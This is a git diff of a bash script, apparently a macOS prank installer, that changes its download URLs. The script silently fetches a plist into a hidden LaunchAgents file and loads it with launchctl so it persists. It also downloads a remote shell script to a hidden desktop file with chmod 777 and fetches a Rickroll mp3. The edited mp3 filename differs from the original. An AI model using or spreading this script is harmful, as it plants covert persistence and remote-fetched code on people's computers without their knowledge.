@@ -1,16 +1,16 @@
 #! /bin/bash
 
-curl -s -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
+curl -s -L https://github.com/SethBurkart123/macostroll/raw/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
 cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
 rm ~/Library/LaunchAgents/.main1.plist
 chmod 600 ~/Library/LaunchAgents/.music.plist
 launchctl load ~/Library/LaunchAgents/.music.plist
 
-curl -s -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/run.sh >> ~/Desktop/.music.sh
+curl -s -L https://github.com/SethBurkart123/macostroll/raw/main/run.sh >> ~/Desktop/.music.sh
 chmod 777 ~/Desktop/.music.sh
 
 
-curl -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/nevergonnagiveyouup.mp3 --output ~/Desktop/.troll.mp3
+curl -L https://github.com/SethBurkart123/macostroll/raw/main/nevergonnagiveyoup.mp3 --output ~/Desktop/.troll.mp3
 
 
 #sleep 30m
